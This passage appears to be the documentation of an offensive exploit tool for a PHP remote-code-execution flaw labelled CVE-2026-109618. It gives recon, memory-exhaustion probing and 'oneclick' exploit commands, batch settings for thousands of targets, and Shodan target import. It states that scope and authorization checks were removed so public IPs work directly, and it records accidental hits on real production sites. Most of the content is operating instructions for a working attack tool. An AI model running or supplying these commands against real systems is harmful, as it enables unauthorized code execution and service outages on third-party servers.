| `recon --fast` | `attack/p2s_ext.py recon -u <url> --fast --json` | read-only prescreen: home page version + 2 sink entries, **2–3 requests/target** | same as below | none (usable directly on the public internet) |
| `recon` | `attack/p2s_ext.py recon -u <url> --json` | read-only: multi-channel version + 16-entry sink probing + profile hit, **sends no OOM payload** | `AFFECTED` / `DOS_ONLY` / `UNKNOWN_VERSION` / `NOT_AFFECTED` / `NO_SINK` / `UNREACHABLE` | none (usable directly on the public internet) |
| `recon --deep` | adds `--deep --budget N --delay S [--probe-sizes ...]` | graduated OOM landing-point probing (max 16MB per attempt, may cause 5xx), measures `oom_at_mb`, `post_max_size>memory_limit` | same as above, with `evidence.deep{}` carrying measured values | none (usable directly on the public internet) |
| `oneclick` | `attack/p2s_ext.py oneclick -u <url> --http-read <url> --rounds N --tries N --force --postex --only <cmd> --outdir ...` | real exploitation chain: Stage-1/2 leak → forge HashTable → execute short command → HTTP readback of proof | `RCE_CONFIRMED`(rc0) / `RCE_LIKELY`(10) / `DOS_ONLY`(20) / `NOT_AFFECTED`(30) / `NO_SINK`(40) / `UNREACHABLE`(50) / `DENIED`(3) | **only needs `attack_ack`**; missing means 400 and zero requests |

**Other**

- Concurrency: one subprocess per target (crash/timeout isolation), default concurrency 16, request timeout 20s, per-target timeout 900s;
- **The concurrency cap is adjustable**: `P2S_MAX_WORKERS` (default 32, hard cap 64). The GUI input box is 1–64 and the server clamps to that variable;
  for thousands of targets we suggest `P2S_MAX_WORKERS=64 python3 gui/server.py --host 127.0.0.1 --port 8899` (trade off against CPU/bandwidth);
- **Fast mode (checked by default in the GUI)**: `recon --fast` only checks the home page version + 2 sink entries, **2–3 requests/target**;
  it skips magic/phpinfo/404 probing and is mutually exclusive with `--deep`. For thousands of targets, prescreen fast first, then run full `recon`/`oneclick` on the candidates;
- **TCP precheck**: each target first gets one TCP connect with a 2.5s cap; if it cannot connect it is immediately judged `UNREACHABLE`, so 3 HTTP timeouts are not burned;
- **Timeout display**: when a subprocess exceeds the "per-target timeout" the verdict is `TIMEOUT` (a missing `oneclick_report.json` is no longer shown as `FileNotFoundError`);
  `oneclick` exits early when scan rules `NOT_AFFECTED_OR_PATCHED` / `AFFECTED_DOS_ONLY` / `NO_SESSION_SINK` / `UNREACHABLE`, so it does not waste an exploit run until timeout;
- **Faster at scale**: run `recon` first (a few requests/target) to filter out `RCE_LIKELY/AFFECTED`, then run `oneclick` only on those;
  each +1 in `oneclick`'s `rounds` adds roughly one more full three-stage attempt (success rate up, runtime up linearly), while `tries` is retries within a single round;
  `delay` is the per-request interval, set it to 0 for batches; when the target is already `PATCHED`/`DOS_ONLY`, oneclick exits early instead of burning all rounds;
- **Local resources**: each concurrent subprocess holds about 20–40MB resident (peak depends on the request body), 16 concurrent is about 0.5–1GB;
  a single OOM request body can reach several MB to a dozen-plus MB, and at high concurrency upstream bandwidth saturates briefly — that is the main cause of "machine stuttering" (network + CPU), not a memory leak;
  when it stutters, lower `P2S_MAX_WORKERS`/concurrency, or use `nice -n 10` to yield CPU; the result table renders only the first 300 rows by default (use JSON/CSV export for the full data).
- **Target count: unlimited by default** (the old "at most 500 targets per run" hard cap has been removed). You can paste/import any number at once;
  duplicate targets are deduplicated automatically (input order preserved). To throttle, set the env var `P2S_MAX_TARGETS=N` at startup (0 or unset = unlimited):
  `P2S_MAX_TARGETS=2000 python3 gui/server.py --host 127.0.0.1 --port 8899`;
  for very large batches, classify with `recon` (read-only) first, then run `oneclick` on the `RCE_LIKELY/AFFECTED` subset, to avoid sending OOM packets at targets without the preconditions;
- TLS: ticking "ignore TLS certificate" = CLI `--insecure`; when unticked, certificate errors are judged `UNREACHABLE`;
- On disk `gui_runs/<job_id>/`: recon writes `<name>.recon.json`, oneclick writes `oc_<name>/oneclick_report.json`,
  and the page's "Export JSON / CSV" reads these two kinds of file (recomputable archive);
- "Load recent jobs" = `GET /api/jobs` (by report mtime descending, most recent 20);
- Evidence only takes CVE-specific fields: `mode/verdict/version/sink/profile/rce/proof_body/proof_url/postex_rc/steps/post_max_gt_memory/oom_at_mb/post_max_hit_mb`.

**Hard command cap**: oneclick's `only` is limited by `cap = ht_size − 0x98 − 1`, which is **14 bytes** in the local 8.4.26 build
(`id`, `env`, `cat /etc/p*` are feasible; writing a webshell, reverse shell and persistence are not).

**Equivalent CLI capability**

```bash
python3 attack/p2s_ext.py recon -u https://target/ --fast --json                       # fast prescreen (2–3 requests)
python3 attack/p2s_ext.py recon -u https://target/ --json                              # read-only classification
python3 attack/p2s_ext.py recon -u https://target/ --deep --budget 6 --delay 0.3 --json # includes OOM probing
python3 attack/p2s_ext.py oneclick -u https://target/ --http-read https://target/ \
    --rounds 8 --tries 2 --force --postex --only id --outdir out/target
```

## 22. Shodan asset import (GUI)

### 22.1 Targets go straight into the queue

The GUI performs no scope/authorization validation: an address pasted into the target box (including public IPs) goes straight into the queue. The server no longer derives or stores a scope, and the `scope` and `authorized` fields of `/api/scan` are ignored even if passed.

- Does **not** do "pull third-party public IPs from Shodan → auto-fill → auto-exploit". See 22.4 for the reason.
- Destructive reminder: the OOM chain will blow up workers; use it only on assets you hold **written authorization** for.

### 22.2 Request example

```json
{"targets":["10.0.0.5:443","https://app.corp.example/"]}
```

`POST /api/scan` only reads `targets`, `mode` and the per-mode parameters; pasting enqueues, with no scope precheck.

### 22.3 Shodan import (strictly limited to your own assets)

`POST /api/import/shodan`

```json
{"api_key":"<optional, defaults to reading SHODAN_API_KEY>","query":"net:203.0.113.0/24 http.component:\"PHP\"","limit":50}
```

Constraints (hard server-side validation, `_SELF_SCOPE_RE`):

| query content | Response |
|---|---|
| no `net:` / `org:` / `hostname:` / `asn:` | **400**, search refused |
| has the above qualifiers but no key | **400** |
| has qualifiers + `dry_run:true` | **200**, only echoes query/limit, no network access |
| has qualifiers + valid key | **200**, returns `targets:["ip:port",...]` |

The returned `targets` are only a **candidate list**; the frontend merges and dedupes them into the target box. Whether to scan and whether to run CVE exploitation still requires explicit action from you (the GUI offers no one-click exploit).

Example queries:
- `net:203.0.113.0/24 http.component:"PHP" port:80,443`
- `org:"MyCompany" http.server:"Apache" http.title:"phpinfo"`
- `hostname:*.corp.example`

### 22.4 Boundary: why it does not do "Shodan auto-finds RCE-able public IPs and auto-attacks them"

1. **Legal and scope**: this amounts to launching unauthorized attacks against arbitrary third-party hosts. This project has already had two real accidental-hit precedents (`82.165.30.101`, a Spanish municipal tourism portal, and `125.59.21.90`, a Hong Kong e-commerce site), both stopped immediately after confirming they were real production sites — automation would only amplify this risk into mass incidents.
2. **Technically it does not work either**: the 109618 RCE needs 4 build-related constants (`zif/dtor/htdata/ht_size`) + `post_max_size > memory_limit` + a `session_start()` sink. The vast majority of real public targets can only reach a DoS verdict (measured: 8091 with production defaults exits 20; `83.168.105.132` has zero `Set-Cookie` site-wide, disproving the Stage-1 leak). "If you can find it you can exploit it" is an illusion.
3. **Real harm with a cost**: the OOM chain creates dangling pointers by blowing up workers; a single request of ~15MB with 150 concurrency can amplify latency 172-fold. Against a third party that is indiscriminate service degradation.

Compliant approach: use Shodan only to search **your own netblock/ASN/organization**, treat the results as an asset inventory, then paste them into the target box per 22.2, first do a read-only `fingerprint` verdict, and only then consider whether to exploit.

## 23. https targets and `--insecure` (self-signed/expired certificates)

The tool's exploit stage **does not use** urllib/requests; it maintains its own TCP connection (`attack/php2shell_rce.py:_dial`)
so that the "poison request + dereference request" pair is pinned to the same keep-alive connection. https support therefore needs TLS
wrapped separately around the socket returned by `_dial`, rather than delegated to an HTTP client library.

**Behavior contract (since v1.17)**

| Scenario | Behavior |
|---|---|
| `-u http://...` | plain text only, behavior completely identical to the old version |
| `-u https://...` default | strict validation of the server certificate and hostname (production sites must use this) |
| `-u https://... --insecure` | disables certificate validation and hostname validation (only for **authorized** labs with self-signed/expired certificates) |

Implementation points (for auditing):

- `attack/php2shell_rce.py`: `TLS_STATE` + `set_tls()/get_tls()` + `_maybe_tls()`; `parse_target()`
  defaults the port to 443 when scheme=https and automatically calls `set_tls(True)`; `_dial()` wraps the socket uniformly, so
  Stage-1/2/3, `keepalive_pair` and every other stage get TLS automatically.
- `poc_eness/poc_109618.py`: `DEFAULT_INSECURE` controls certificate validation in `Target._connect()`; the environment variable
  `PHP2SHELL_INSECURE=1` is supported as a fallback, making it easy for a parent process to pass through when spawning child processes.
- `attack/php2shell.py`: `probe_leak` / `run_exploit` call
  `RCE.set_tls(...)` after obtaining the tls flag from `parse_url()`; `--insecure` appears in the common options of all subcommands; `apply_net_options()` reads both
  `--insecure` and `PHP2SHELL_INSECURE=1`.
- `attack/p2s_ext.py`: all subcommands (`symbols/fingerprint/calibrate/blind/postex/oneclick`) uniformly
  inject `--insecure`; after parsing it sets `PHP2SHELL_INSECURE=1` and syncs `poc_109618.DEFAULT_INSECURE`,
  ensuring both internal subprocesses and in-process HTTP probing relax validation. `requests_get()` automatically
  uses `verify=False` and suppresses `InsecureRequestWarning` when insecure; `urllib` probing goes through `_ssl_ctx()` with a non-validating context.
- `gui/server.py`: the request body's `insecure` lands in `opts["insecure"]`, and `_run_one()` appends `--insecure` when assembling the command;
  the frontend `static/index.html` has an "https skip certificate validation (self-signed labs only)" checkbox, and `app.js` submits
  `insecure: $("insecure").checked`. The GUI only runs read-only fingerprinting and never opens fire.

**Unreachable verdict fix**: when `fingerprint` gets no response on any probe path (connection refused / timeout / TLS validation failure)
it now returns **50 unreachable** and hints "for an https self-signed certificate add `--insecure`"; the old version would falsely report `10 LIKELY_RCE`.

Self-test (local TLS-terminating reverse proxy 8443 → 8090, self-signed certificate CN=127.0.0.1):

```
python3 attack/p2s_ext.py fingerprint -u https://127.0.0.1:8443/            # rc=50 unreachable (certificate validation failed)
python3 attack/p2s_ext.py fingerprint -u https://127.0.0.1:8443/ --insecure # rc=0 AFFECTED, PHP/8.4.26
python3 attack/p2s_ext.py oneclick   -u https://127.0.0.1:8443/ --insecure \
        --http-read https://127.0.0.1:8443/ --rounds 8 --tries 2 --force \
        --postex --only id                                              # rc=0 RCE_CONFIRMED, proof_body=uid=33(www-data)
```

## 24. Using it against real public sites: precondition self-check and reading the results

The tool does **one thing**: unauthenticated RCE validation of CVE-2026-109618 against PHP hosts where "all four necessary conditions hold at once".
It does not promise that "a version inside the range can definitely be exploited" — **a version hit is only one of the necessary conditions**.

**The four necessary conditions (none may be missing)**

1. The PHP version falls in the affected range: `8.2 < 8.2.35`, `8.3 < 8.3.36`, `8.4 < 8.4.27`, `8.5 < 8.5.12`;
2. `post_max_size > memory_limit` (the root cause of this primitive; the official `php:x-apache` default 128M/8M does not satisfy it);
3. An entry point exists that calls `session_start()` (a dangling object exists only when `session.upload_progress.enabled=On`);
4. The target build's offsets match a built-in profile, or can be calibrated via `calibrate` (they differ per distribution/compile options).

**The remotely observable part**: 1 can be determined by `fingerprint` reading `X-Powered-By`/`Server`;
2 cannot be probed remotely without loss (`post_max_size` is not reflected in any response), so it can only be inferred indirectly from "whether Stage-1 leaks";
3 can be roughly judged from whether `Set-Cookie` (PHPSESSID and other session cookies) appears in the response; 4 is calibrated with a `calibrate --collab` callback.

**Authorization and gates**

- The code layer no longer validates address scope: public/private targets are treated alike, and it will not exit 3 just because a target is public;
- This repo provides no proxy pool/egress IP rotation, and does no "mass attack across the whole internet". Targets must be assets you hold **written authorization** for.

**Reading the exit codes**

| Exit code | Meaning | Suggested action |
|---|---|---|
| 0 | RCE confirmed (or AFFECTED with complete evidence) | read `proof_body` and verify `uid=`; the tool merely reporting success does not count |
| 10 | LIKELY_RCE (preconditions hold, Stage-1 obtained no leak) | retry with `--rounds 8 --tries 2`; if still 10, treat it as "unproven" |
| 15 | PREMISES_ONLY (only the preconditions were confirmed) | add `--force`/more rounds; do not publicly claim RCE |
| 20 | AFFECTED_DOS_ONLY (`post_max_size <= memory_limit`) | this target is not RCE-able, stop trying |
| 30 | SAFE / PATCHED (version already fixed) | done |
| 40 | no sink / no session sink | done |
| 50 | unreachable (connection/TLS failure/timeout) | for https self-signed add `--insecure`; confirm network reachability |

**Capability boundary (measured)**: after success the single-command cap is `cap = ht_size - 0x98 - 1`, which is **14 bytes** in the local 8090 build,
so all it can do is "gather data with short commands + redirect into the webroot and read back"; it cannot write a webshell, cannot reverse shell, cannot persist,
and cannot move laterally. 640 root files such as `/etc/shadow` are not readable.

**Log footprint**: an OOM-type trigger leaves the complete POST and UA in the target's access log, and leaves in the error log
`zend_mm_heap corrupted` / `SIGSEGV` / `SIGABRT`, which the target side can capture reliably with three greps.
The tool does not clean logs (that is post-exploitation behavior, outside this tool's scope).

## 25. `recon`: four-precondition reconnaissance on real sites (read-only by default, only `--deep` touches the landing point)

Real production sites commonly strip `X-Powered-By`, hide `phpinfo` and customize 404s, so `fingerprint`'s
"response body `PHP/x.y.z`" criterion simply fails. `recon` gathers evidence through several **read-only** channels and splits
"can it RCE" into four separately verifiable preconditions, emitting a classified verdict and the next command.

### 25.1 The four preconditions

| # | Precondition | How it is judged | Handling when unmeasurable |
|---|---|---|---|
| 1 | Version falls in the affected range | header (`X-Powered-By`/`Server`), body, `?=PHPE9568F36-D428-11d2-A769-00AA001ACF42` (logo)/`...F34...` (credits)/`PHPB8B5F2A0-...` (phpinfo css), common `phpinfo` landing points, 404 signature (`No input file specified` = php-fpm) | returns `UNKNOWN_VERSION`, no guessing |
| 2 | A session sink exists | whether the `Set-Cookie` returned by the common entry list contains `PHPSESSID`/session cookies (same-name multi-values are merged, so nothing is missed) | `NO_SESSION_SINK` → 109618 has no sink |
| 3 | `post_max_size > memory_limit` | `--deep`: incrementally sized multipart header bomb (0.5/1/2/4/8/16MB, adjustable), looking at 500+`Allowed memory size`/`in Unknown on line 0` and other OOM signatures | PHP **silently truncates** bodies over `post_max_size` (**returns no 413**), so "no OOM within the max size" = landing point unreachable → `DOS_ONLY` |
| 4 | A usable build offset exists | the built-in profile table matches the version | no hit → `NEEDS_CALIBRATION`, suggesting `calibrate --collab` |

There is also a measured blacklist `KNOWN_NO_RCE` (currently only `8.2.12`: inside the range but with no Stage-1 infoleak; all 6 measured rounds failed)
which downgrades directly to `DOS_ONLY`, avoiding false positives.

### 25.2 Usage

```bash
# fast prescreen (2–3 requests/target; use this first for thousands of targets)
python3 attack/p2s_ext.py recon -u https://target/ --fast --json

# full read-only (~23 requests, including 5 phpinfo landing points and 3 ?= magic queries)
python3 attack/p2s_ext.py recon -u https://target/ [--insecure]

# deep: adds landing-point probing (sends bodies up to 16MB, may cause 5xx/worker restarts, requires authorization)
python3 attack/p2s_ext.py recon -u https://target/ --deep --budget 6 --delay 1.0 \
        [--probe-sizes 0.5,1,2,4,8,16] [--entries /,/index.php,/login.php]

# machine-readable
python3 attack/p2s_ext.py recon -u https://target/ --json
```

When `--fast` and `--deep` are given together, `--fast` wins and `--deep` is skipped (fast mode only does the read-only prescreen).

Address scope is no longer validated: public targets can be run directly (still only for assets you hold **written authorization** for).

### 25.3 verdict and exit codes

| verdict | exit | Meaning |
|---|---|---|
| `RCE_LIKELY` | 10 | version affected + sink present + landing point (deep) holds + build known → oneclick is viable |
| `NEEDS_CALIBRATION` | 10 | same as above but the build is unknown → run `calibrate --collab` first |
| `NEEDS_PRECOND_PROBE` | 10 | version affected and sink present, landing point untested → add `--deep` |
| `DOS_ONLY` | 20 | inside the fixed line but not RCE-able (`KNOWN_NO_RCE`), or the landing point is truncated by `post_max_size` |
| `NOT_AFFECTED` | 30 | version ≥ the fix line, or earlier than the affected range |
| `NO_SESSION_SINK` | 15 | version affected, but the probed entries issue no session cookie → no `session_start()` sink, the CVE has no trigger surface |
| `UNKNOWN_VERSION` | 15 | confirmed to run PHP (session cookie present) but the version cannot be determined |
| `UNKNOWN_PRECOND` | 15 | `--deep` incremental probing triggered no OOM (the landing point may be above the probe cap; try `--probe-sizes 32,64`) |
| `UNKNOWN` | 50 | no PHP evidence at all (not PHP or a site-wide WAF) |

> exit 15 is recon's shared fallback code: `NO_SESSION_SINK` / `UNKNOWN_VERSION` / `UNKNOWN_PRECOND` all return 15; check `verdict` in the report for the specifics.

### 25.4 Division of labor with `oneclick`

`recon` only judges and gathers evidence and **never opens fire**; once `RCE_LIKELY` is confirmed, use `oneclick`:

```bash
python3 attack/p2s_ext.py oneclick -u https://target/ --http-read https://target/ \
        --rounds 8 --tries 2 --force --postex --only id --outdir out
```

### 25.5 Local positive/negative controls (regression baseline)

| Target | Version/config | recon verdict |
|---|---|---|
| `:8090` | 8.4.26, 8M/64M | `RCE_LIKELY` (OOM@1MB, post_max>memory=True, profile hit) → oneclick rc=0 `uid=33` |
| `:8088` | 8.2.12, 8M/64M | `DOS_ONLY` (KNOWN_NO_RCE, no infoleak) |
| `:8089` | 8.2.35 patched | `NOT_AFFECTED` |
| `:8091` | 8.4.26, 128M/8M | `DOS_ONLY` (no OOM within 16MB → post_max silent truncation) |
| `:8900` DVWA | PHP 7.0.30, `expose_php Off` | `UNKNOWN_VERSION` (PHPSESSID present, but the version cannot be determined externally) |

## 26. Tool boundaries: CVE-2026-109618 only

| Item | Conclusion |
|---|---|
| Sole vulnerability target | CVE-2026-109618 (PHP multipart OOM → `session.upload_progress` teardown skipped by longjmp → dangling pointer → dereference on the same keep-alive connection to forge `HashTable.pDestructor = zif_system`) |
| Explicitly not included | SQLi, blind injection, XSS, CSRF, LFI/RFI, command injection, arbitrary file upload/inclusion, SSRF, weak password brute force, CSP/session-specific work — no corresponding implementation exists in the source |
| Affected versions | `8.2 < 8.2.35`, `8.3 < 8.3.36`, `8.4 < 8.4.27`, `8.5 < 8.5.12`; `8.2.12` is inside the range but has **no infoleak**, and measured it can only DoS (`KNOWN_NO_RCE`) |
| Necessary conditions | 1) affected build 2) `post_max_size > memory_limit` 3) the entry script calls `session_start()` 4) calibratable heap (profile or `calibrate`); missing one means DoS only or not attackable |
| Verdict honesty | `AFFECTED` ≠ RCE-able. `RCE_CONFIRMED` is judged only when `oneclick` reads back `uid=`; `DOS_ONLY` means the preconditions satisfy only the DoS condition |
| Capability boundary (after RCE) | single command ≤`ht_size−0x98−1` (14B locally); forensics is possible (`id`/`env`/`cat /etc/p*`); webshell, reverse shell, persistence, lateral movement and log clearing are **not** |
| Not losslessly probeable | `post_max_size` cannot be read exactly from outside; `--deep` infers it as "no OOM yet ≥8MB can be sent ⇒ silent truncation", and the report labels it as inference rather than measurement |
| Authorization gate | the GUI has no authorization/scope confirmation at all; `oneclick` still requires `attack_ack`; the CLI has removed the scope parameter, so public IPs work directly |
| What it does not do | no internet-wide automated attacking, no built-in third-party anonymous proxy pool, no log clearing/anti-forensics, no probes against unauthorized public targets |
